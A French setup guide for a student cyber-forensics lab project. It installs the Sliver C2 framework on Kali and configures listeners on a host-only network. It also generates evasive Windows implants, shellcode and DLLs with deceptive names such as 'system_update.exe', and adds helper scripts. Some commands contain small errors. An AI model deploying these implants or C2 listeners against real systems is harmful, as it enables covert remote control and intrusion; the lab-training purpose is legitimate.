# PROJET M1 - Configuration Silver C2 sur Kali Linux
## Guide d'Installation et Configuration Détaillé

### 🎯 Objectif
Configurer Silver C2 Framework sur VM1 (Kali Linux) pour la simulation d'attaque post-exploitation dans le cadre du projet M1 Cyber Forensics.

---

## 📋 Prérequis

### Vérification système
```bash
# Vérifier la version de Kali
cat /etc/os-release

# Vérifier les ressources
free -h
df -h
nproc
```

### Mise à jour du système
```bash
# Mise à jour complète
sudo apt update && sudo apt upgrade -y

# Installation des dépendances essentielles
sudo apt install -y curl wget git build-essential
sudo apt install -y python3-pip python3-dev python3-venv
sudo apt install -y mingw-w64 binutils-mingw-w64 g++-mingw-w64
sudo apt install -y nmap netcat-traditional socat
```

---

## 🛠️ Installation de Silver C2

### Méthode 1 : Installation automatique (Recommandée)
```bash
# Utiliser le script fourni dans le projet
cd /home/kali
chmod +x install-silver-c2.sh
./install-silver-c2.sh
```

### Méthode 2 : Installation manuelle
```bash
# Installer Go (si nécessaire)
GO_VERSION="1.21.5"
wget https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go${GO_VERSION}.linux-amd64.tar.gz

# Configurer Go
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
source ~/.bashrc

# Installer Silver C2
curl https://sliver.sh/install | sudo bash

# Vérifier l'installation
sliver-server version
sliver-client version
```

### Méthode 3 : Compilation depuis les sources
```bash
# Cloner le dépôt
git clone https://github.com/BishopFox/sliver.git
cd sliver

# Compiler
make
sudo make install

# Nettoyer
cd ..
rm -rf sliver
```

---

## 🔧 Configuration Initiale

### Structure des répertoires projet
```bash
# Créer l'arborescence pour le projet M1
mkdir -p ~/project-m1/{silver-config,payloads,logs,evidence,reports}
mkdir -p ~/project-m1/scenarios/{initial-access,persistence,lateral-movement,exfiltration}

# Répertoires Silver workspace
mkdir -p ~/silver-workspace/{payloads,logs,configs,scripts,certificates}

# Permissions appropriées
chmod 750 ~/project-m1/
chmod 750 ~/silver-workspace/
```

### Configuration réseau VM1
```bash
# Configurer l'interface Host-Only
sudo tee /etc/netplan/01-netcfg.yaml << EOF
network:
  version: 2
  ethernets:
    eth1:
      dhcp4: false
      addresses: [192.168.56.10/24]
EOF

# Appliquer la configuration
sudo netplan apply

# Vérifier la connectivité
ip addr show
ping -c 3 192.168.56.20  # Test vers VM2 (Windows)
```

### Configuration du firewall
```bash
# Configuration UFW pour Silver C2
sudo ufw allow 8080/tcp comment "Silver HTTP"
sudo ufw allow 8443/tcp comment "Silver HTTPS"  
sudo ufw allow 53/udp comment "Silver DNS"
sudo ufw allow 80/tcp comment "Silver HTTP Alt"
sudo ufw allow 443/tcp comment "Silver HTTPS Alt"
sudo ufw allow ssh
sudo ufw enable

# Vérifier les règles
sudo ufw status numbered
```

---

## 🚀 Démarrage et Configuration de Silver

### Premier démarrage du serveur
```bash
# Démarrer Silver en mode interactif (première fois)
sudo sliver-server

# Le serveur va générer automatiquement :
# - Certificats CA
# - Certificats serveur
# - Configuration par défaut
```

### Configuration d'un opérateur
```bash
# Dans la console Silver server
sliver > operators new --name pentester --lhost 192.168.56.10

# Cela génère un fichier de configuration pour l'opérateur
# Le fichier sera sauvegardé dans ~/.sliver/configs/
```

### Démarrage en mode démon
```bash
# Arrêter le serveur interactif (Ctrl+C)
# Démarrer en mode démon pour usage permanent
sudo sliver-server daemon --lhost 192.168.56.10 --lport 31337
```

### Test de connexion client
```bash
# Nouveau terminal
sliver-client

# Vous devriez voir :
# [*] Connecting to localhost:31337...
# [*] Connected to localhost:31337
# sliver >
```

---

## 📡 Configuration des Listeners

### Listeners pour le projet M1
```bash
# Se connecter au serveur
sliver-client

# Créer les listeners nécessaires au projet

# 1. HTTP Listener (principal)
sliver > http --lhost 192.168.56.10 --lport 8080

# 2. HTTPS Listener (sécurisé)
sliver > https --lhost 192.168.56.10 --lport 8443

# 3. DNS Listener (furtif)
sliver > dns --domains project.local --lhost 192.168.56.10 --lport 53

# 4. Listener TCP pour staging
sliver > stage-listener --url tcp://192.168.56.10:8888

# Vérifier les listeners actifs
sliver > listeners
```

### Configuration HTTPS avec certificats personnalisés
```bash
# Générer des certificats auto-signés pour le projet
openssl req -new -x509 -sha256 -key ~/.sliver/certs/ca-key.pem \
    -out ~/silver-workspace/certificates/project-m1.crt \
    -days 365 \
    -subj "/C=FR/ST=IDF/L=Paris/O=Project-M1/CN=silver.project.local"

# Utiliser le certificat personnalisé
sliver > https --lhost 192.168.56.10 --lport 8443 \
    --cert ~/silver-workspace/certificates/project-m1.crt \
    --key ~/.sliver/certs/ca-key.pem
```

---

## 🎯 Génération de Payloads pour le Projet

### Profils spécifiques au projet M1
```bash
# Dans la console Silver

# Profil Windows 10 Standard
sliver > profiles new --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format exe \
    --skip-symbols --evasion \
    win10-standard

# Profil Windows 10 DLL
sliver > profiles new --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format shared \
    --skip-symbols --evasion \
    win10-dll

# Profil Beacon (avec jitter pour éviter détection)
sliver > profiles new beacon --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format exe \
    --jitter 30s --interval 120s \
    --skip-symbols --evasion \
    win10-beacon

# Profil Shellcode (pour injection)
sliver > profiles new --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format shellcode \
    --skip-symbols --evasion \
    win10-shellcode

# Lister les profils créés
sliver > profiles
```

### Génération des payloads du projet
```bash
# Générer les payloads pour différents scénarios

# 1. Payload principal (document infecté)
sliver > profiles generate win10-standard --save ~/project-m1/payloads/document_scanner.exe

# 2. Payload de persistance
sliver > profiles generate win10-beacon --save ~/project-m1/payloads/system_update.exe

# 3. DLL pour injection
sliver > profiles generate win10-dll --save ~/project-m1/payloads/library.dll

# 4. Shellcode pour techniques avancées
sliver > profiles generate win10-shellcode --save ~/project-m1/payloads/payload.bin
```

### Payloads avec techniques d'évasion avancées
```bash
# Payload avec obfuscation et anti-analysis
sliver > generate --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format exe \
    --evasion --skip-symbols \
    --canary "canary-m1-project" \
    --save ~/project-m1/payloads/advanced_evasion.exe

# Payload multiformat pour tests
sliver > generate --http 192.168.56.10:8080 \
    --os windows --arch amd64 --format service \
    --evasion --skip-symbols \
    --save ~/project-m1/payloads/service_payload.exe
```

---

## 🔍 Monitoring et Logging

### Configuration des logs pour le projet
```bash
# Créer les répertoires de logs
mkdir -p ~/project-m1/logs/{server,client,sessions,payloads}

# Démarrer le serveur avec logs détaillés
sudo sliver-server daemon \
    --lhost 192.168.56.10 \
    --lport 31337 \
    --log-level debug \
    --log-file ~/project-m1/logs/server/silver-server.log
```

### Scripts de monitoring
```bash
# Script de surveillance des connexions
cat > ~/project-m1/scripts/monitor-connections.sh << 'EOF'
#!/bin/bash
LOG_FILE="~/project-m1/logs/connections.log"

while true; do
    echo "[$(date)] === Silver C2 Status ===" >> $LOG_FILE
    
    # Connexions réseau
    netstat -tlnp | grep -E "(8080|8443|53)" >> $LOG_FILE
    
    # Sessions actives (si possible via API)
    echo "--- Sessions ---" >> $LOG_FILE
    sliver-client -c "sessions" >> $LOG_FILE 2>&1
    
    echo "" >> $LOG_FILE
    sleep 60
done
EOF

chmod +x ~/project-m1/scripts/monitor-connections.sh
```

---

## 🧪 Tests et Validation

### Test des listeners
```bash
# Test HTTP
curl -k http://192.168.56.10:8080

# Test HTTPS
curl -k https://192.168.56.10:8443

# Test DNS (depuis VM2 si possible)
nslookup project.local 192.168.56.10
```

### Test de génération de payload
```bash
# Test simple
sliver-client -c "generate --http 192.168.56.10:8080 --os windows --format exe --save /tmp/test.exe"

# Vérifier le fichier généré
file /tmp/test.exe
ls -la /tmp/test.exe
```

### Test de connectivité complète
```bash
# Script de test complet
cat > ~/project-m1/scripts/test-silver-setup.sh << 'EOF'
#!/bin/bash

echo "=== Test Configuration Silver C2 - Projet M1 ==="

# Test 1: Serveur actif
echo "1. Test serveur Silver..."
if pgrep -f "sliver-server" > /dev/null; then
    echo "✓ Serveur Silver actif"
else
    echo "✗ Serveur Silver non actif"
fi

# Test 2: Listeners
echo "2. Test des listeners..."
netstat -tlnp | grep -E "(8080|8443)" && echo "✓ Listeners actifs" || echo "✗ Listeners non actifs"

# Test 3: Connectivité réseau
echo "3. Test connectivité vers VM2..."
ping -c 1 192.168.56.20 > /dev/null && echo "✓ VM2 accessible" || echo "✗ VM2 non accessible"

# Test 4: Génération payload
echo "4. Test génération payload..."
sliver-client -c "generate --http 192.168.56.10:8080 --os windows --format exe --save /tmp/test-$(date +%s).exe" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "✓ Génération payload réussie"
else
    echo "✗ Échec génération payload"
fi

echo "=== Test terminé ==="
EOF

chmod +x ~/project-m1/scripts/test-silver-setup.sh
./~/project-m1/scripts/test-silver-setup.sh
```

---

## 🔐 Sécurisation de l'Installation

### Permissions et accès
```bash
# Sécuriser les répertoires Silver
sudo chown -R root:root /opt/sliver/
chmod 755 /opt/sliver/

# Sécuriser les certificats
chmod 600 ~/.sliver/certs/*
chmod 700 ~/.sliver/certs/

# Sécuriser les répertoires du projet
chmod 750 ~/project-m1/
chmod 640 ~/project-m1/payloads/*
```

### Sauvegarde de la configuration
```bash
# Créer une sauvegarde de la configuration
tar czf ~/project-m1/backups/silver-config-$(date +%Y%m%d).tar.gz \
    ~/.sliver/ \
    ~/project-m1/scripts/ \
    ~/silver-workspace/

# Script de sauvegarde automatique
cat > ~/project-m1/scripts/backup-config.sh << 'EOF'
#!/bin/bash
BACKUP_DIR="~/project-m1/backups"
DATE=$(date +%Y%m%d-%H%M%S)

mkdir -p $BACKUP_DIR

tar czf "$BACKUP_DIR/silver-config-$DATE.tar.gz" \
    ~/.sliver/ \
    ~/project-m1/ \
    ~/silver-workspace/

echo "Sauvegarde créée: $BACKUP_DIR/silver-config-$DATE.tar.gz"

# Nettoyer les anciennes sauvegardes (> 7 jours)
find $BACKUP_DIR -name "silver-config-*.tar.gz" -mtime +7 -delete
EOF

chmod +x ~/project-m1/scripts/backup-config.sh
```

---

## 📊 Scripts d'Automatisation pour le Projet

### Script de démarrage complet
```bash
cat > ~/project-m1/scripts/start-silver-project.sh << 'EOF'
#!/bin/bash

echo "=== Démarrage Silver C2 - Projet M1 ==="

# Vérifier si le serveur tourne déjà
if pgrep -f "sliver-server" > /dev/null; then
    echo "Silver serveur déjà actif"
else
    echo "Démarrage du serveur Silver..."
    sudo sliver-server daemon \
        --lhost 192.168.56.10 \
        --lport 31337 \
        --log-level info \
        --log-file ~/project-m1/logs/server/silver-server.log &
    
    sleep 5
fi

# Configurer les listeners
echo "Configuration des listeners..."
sliver-client -c "http --lhost 192.168.56.10 --lport 8080" > /dev/null 2>&1
sliver-client -c "https --lhost 192.168.56.10 --lport 8443" > /dev/null 2>&1

echo "✓ Silver C2 configuré pour le projet M1"
echo "✓ Listeners actifs sur :"
echo "  - HTTP  : 192.168.56.10:8080"
echo "  - HTTPS : 192.168.56.10:8443"
echo ""
echo "Pour se connecter : sliver-client"
EOF

chmod +x ~/project-m1/scripts/start-silver-project.sh
```

### Script d'arrêt propre
```bash
cat > ~/project-m1/scripts/stop-silver-project.sh << 'EOF'
#!/bin/bash

echo "=== Arrêt Silver C2 - Projet M1 ==="

# Arrêter les sessions actives
echo "Fermeture des sessions actives..."
sliver-client -c "sessions" 2>/dev/null | grep -o "session_[a-zA-Z0-9]*" | while read session; do
    sliver-client -c "close $session" > /dev/null 2>&1
done

# Arrêter les listeners
echo "Arrêt des listeners..."
sliver-client -c "listeners" 2>/dev/null | grep -o "listener_[0-9]*" | while read listener; do
    sliver-client -c "listeners -k $listener" > /dev/null 2>&1
done

# Arrêter le serveur
echo "Arrêt du serveur Silver..."
sudo pkill -f "sliver-server"

echo "✓ Silver C2 arrêté proprement"
EOF

chmod +x ~/project-m1/scripts/stop-silver-project.sh
```

---

## ✅ Validation Finale

### Checklist de configuration
- [ ] Silver C2 installé et fonctionnel
- [ ] Serveur démarré en mode démon
- [ ] Listeners HTTP/HTTPS configurés
- [ ] Profils de payload créés
- [ ] Connectivité réseau vers VM2 validée
- [ ] Logs configurés
- [ ] Scripts d'automatisation créés
- [ ] Sauvegarde de configuration effectuée

### Test final complet
```bash
# Exécuter le test complet
~/project-m1/scripts/test-silver-setup.sh

# Générer un payload de test
sliver-client -c "profiles generate win10-standard --save ~/project-m1/payloads/test-final.exe"

# Vérifier les logs
tail -f ~/project-m1/logs/server/silver-server.log
```

---

**Prochaine étape** : Création des scénarios d'attaque détaillés pour le projet M1.

---

*Configuration Silver C2 pour Projet M1 - Cyber Forensics*